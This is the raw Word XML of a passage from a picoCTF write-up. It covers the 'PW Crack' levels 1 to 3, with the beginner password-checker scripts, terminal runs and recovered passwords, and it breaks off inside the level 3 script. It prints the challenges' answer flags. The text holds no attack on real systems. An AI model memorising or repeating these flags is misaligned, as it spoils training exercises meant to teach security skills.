          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B4F39D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("Welcome back... your flag, user:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F2C252" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        decryption = str_xor(flag_enc.decode(), user_pw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2115C066" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(decryption)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A82BF27" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64EC1A8D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    print("That password is incorrect")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C375D4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="758C215A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BE863A5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D4384C9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>level_1_pw_check()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6249F6AC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">caro@ubuntu:~/Downloads$ python3 level1.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8914A7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Please enter correct password for flag: 691d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07EA214A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Welcome back... your flag, user:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0BC676" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF{545h_r1ng1ng_56891419}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC967A6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>PW Crack 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9A096C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F683DF7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D1DFC61" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT 'syreal' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1267F24D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C73E61" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Can you crack the password to get the flag? Download the password checker </w:t>
      </w:r>
      <w:hyperlink r:id="rId15" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and you'll need the encrypted </w:t>
      </w:r>
      <w:hyperlink r:id="rId16" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>flag</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> in the same directory too.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB0D0E0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t> caro@ubuntu:~/Downloads$ cat level2.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7049FFB5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E3B6E4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>def str_xor(secret, key):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77EC37A5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    #extend key to secret length</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1FA795" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    new_key = key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="256CD5AC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    i = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4DF974" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    while len(new_key) &lt; len(secret):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5967CC67" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        new_key = new_key + key[i]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E196F85" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        i = (i + 1) % len(key)        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D834EF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717372CA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>###############################################################################</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75079189" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E67332D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>flag_enc = open('level2.flag.txt.enc', 'rb').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1823094F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1328EBE0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23EDB17D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70BEDC54" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>def level_2_pw_check():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65176D23" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    user_pw = input("Please enter correct password for flag: ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC2C3D6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> if( user_pw == chr(0x34) + chr(0x65) + chr(0x63) + chr(0x39) ):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20DFC6B4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        print("Welcome back... your flag, user:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D6B8B0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        decryption = str_xor(flag_enc.decode(), user_pw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7814DA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        print(decryption)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC4ABA9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFA62A2" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    print("That password is incorrect")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A6E4CD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74A4615D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>print(chr(0x34) + chr(0x65) + chr(0x63) + chr(0x39))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61382545" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>4ec9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41FAA4E7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>caro@ubuntu:~/Downloads$ python3 level2.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47950DC8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Please enter correct password for flag: 4ec9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3E7FA8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Welcome back... your flag, user:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B42D3E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF{tr45h_51ng1ng_9701e681}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F387BDD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44F4AD0B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>PW Crack 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799F5E14" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E9125C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15723F3F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT 'syreal' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF1160C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE7B31B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Can you crack the password to get the flag? Download the password checker </w:t>
      </w:r>
      <w:hyperlink r:id="rId17" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and you'll need the encrypted </w:t>
      </w:r>
      <w:hyperlink r:id="rId18" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>flag</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and the </w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>hash</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> in the same directory too. There are 7 potential passwords with 1 being correct. You can find these by examining the password checker script.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCF1076" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>caro@ubuntu:~/Downloads$ cat level3.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB7703B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>import hashlib</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5980E5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AB29588" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001F28B3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>def str_xor(secret, key):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46690789" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    #extend key to secret length</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4652E890" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    new_key = key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B0C3B6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    i = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1951106F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    while len(new_key) &lt; len(secret):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F03AC7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        new_key = new_key + key[i]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0BD6EE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        i = (i + 1) % len(key)        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D416537" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D4D975" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>###############################################################################</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A71554" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24E9F75C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>flag_enc = open('level3.flag.txt.enc', 'rb').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EC33A1B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">correct_pw_hash </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>= open('level3.hash.bin', 'rb').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6298F968" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21A4F9FA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5116B493" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>def hash_pw(pw_str):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1A538D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    pw_bytes = bytearray()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6004347E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    pw_bytes.extend(pw_str.encode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C5EB1BF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
